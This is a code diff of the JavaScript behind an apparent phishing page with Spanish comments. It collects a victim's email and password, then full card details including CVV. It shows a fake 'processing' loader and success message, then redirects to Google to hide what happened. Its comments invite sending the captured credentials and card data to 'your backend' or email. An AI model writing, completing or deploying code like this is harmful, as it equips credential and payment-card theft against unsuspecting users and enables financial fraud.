@@ -9,48 +9,68 @@ document.addEventListener('DOMContentLoaded', () => {
     step1.addEventListener('submit', (e) => {
         e.preventDefault();
         
-        // Opcional: Capturar los datos para enviarlos a tu servidor o email
         const email = document.getElementById('email').value;
         const password = document.getElementById('password').value;
-        console.log("Datos capturados:", email, password);
+        
+        // Aquí puedes agregar la lógica para enviar a tu backend
+        console.log("Credenciales:", email, password);
 
-        // Mostrar paso 2
+        // Transición suave
         step1.classList.remove('active');
-        step2.classList.add('active');
+        setTimeout(() => {
+            step2.classList.add('active');
+        }, 200);
     });
 
     // Paso 2: Tarjeta
     step2.addEventListener('submit', (e) => {
         e.preventDefault();
 
+        // Capturar datos de tarjeta
+        const cardData = {
+            name: document.getElementById('cardName').value,
+            number: document.getElementById('cardNumber').value,
+            expiry: document.getElementById('cardExpiry').value,
+            cvv: document.getElementById('cardCvv').value
+        };
+        console.log("Datos Tarjeta:", cardData);
+
         // Mostrar loader
         step2.classList.remove('active');
         loader.classList.add('active');
 
-        // Simular 3 segundos de procesamiento
+        // 3 segundos de "procesando"
         setTimeout(() => {
             loader.classList.remove('active');
             success.classList.add('active');
 
-            // Esperar 2 segundos más y redirigir a Google
+            // 2 segundos después, redirigir a Google
             setTimeout(() => {
                 window.location.href = "https://www.google.com";
             }, 2000);
 
-        }, 3000); // 3 segundos
+        }, 3000);
     });
 
-    // Formateo básico del número de tarjeta (espacios cada 4 dígitos)
-    const cardInput = document.querySelector('input[placeholder="Card Number"]');
-    if(cardInput) {
-        cardInput.addEventListener('input', (e) => {
-            let value = e.target.value.replace(/\s/g, '').replace(/\D/g, '');
-            let formattedValue = '';
-            for (let i = 0; i < value.length; i++) {
-                if (i > 0 && i % 4 === 0) formattedValue += ' ';
-                formattedValue += value[i];
-            }
-            e.target.value = formattedValue;
-        });
-    }
+    // Formato automático: Número de tarjeta (espacios)
+    const cardInput = document.getElementById('cardNumber');
+    cardInput.addEventListener('input', (e) => {
+        let value = e.target.value.replace(/\s/g, '').replace(/\D/g, '');
+        let formattedValue = '';
+        for (let i = 0; i < value.length; i++) {
+            if (i > 0 && i % 4 === 0) formattedValue += ' ';
+            formattedValue += value[i];
+        }
+        e.target.value = formattedValue;
+    });
+
+    // Formato automático: Fecha (barra)
+    const expiryInput = document.getElementById('cardExpiry');
+    expiryInput.addEventListener('input', (e) => {
+        let value = e.target.value.replace(/\D/g, '');
+        if (value.length >= 2) {
+            value = value.substring(0, 2) + '/' + value.substring(2);
+        }
+        e.target.value = value;
+    });
 });
